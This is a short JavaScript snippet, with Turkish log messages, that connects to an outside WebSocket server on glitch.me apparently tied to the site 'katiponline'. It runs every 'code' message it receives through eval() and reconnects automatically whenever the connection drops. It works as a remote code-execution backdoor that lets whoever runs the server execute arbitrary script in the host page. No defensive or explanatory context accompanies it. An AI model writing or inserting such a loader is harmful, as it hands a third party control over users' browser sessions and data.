(function() {
    console.log('Script yüklendi!', 'Zaman:', new Date().toISOString());
    
    function connectWebSocket() {
        const ws = new WebSocket('wss://duello-katiponline-com.glitch.me');

        ws.onopen = () => {
            console.log('WebSocket bağlantısı kuruldu', 'Zaman:', new Date().toISOString());
        };

        ws.onmessage = (event) => {
            console.log('Ham mesaj alındı:', event.data, 'Zaman:', new Date().toISOString());
            try {
                const message = JSON.parse(event.data);
                if (message.type === 'code') {
                    console.log('Yeni kod alındı:', message.data, 'Zaman:', new Date().toISOString());
                    eval(message.data);
                } else {
                    console.log('Bilinmeyen mesaj tipi:', message.type);
                }
            } catch (e) {
                console.error('Mesaj işleme hatası:', e.message, 'Zaman:', new Date().toISOString());
            }
        };

        ws.onclose = () => {
            console.log('WebSocket bağlantısı koptu', 'Zaman:', new Date().toISOString());
            setTimeout(connectWebSocket, 2000); // 2 saniye sonra yeniden bağlan
        };

        ws.onerror = (error) => {
            console.error('WebSocket hatası:', error, 'Zaman:', new Date().toISOString());
        };

        window.myWebSocket = ws;
    }

    // İlk bağlantıyı başlat
    connectWebSocket();
})();
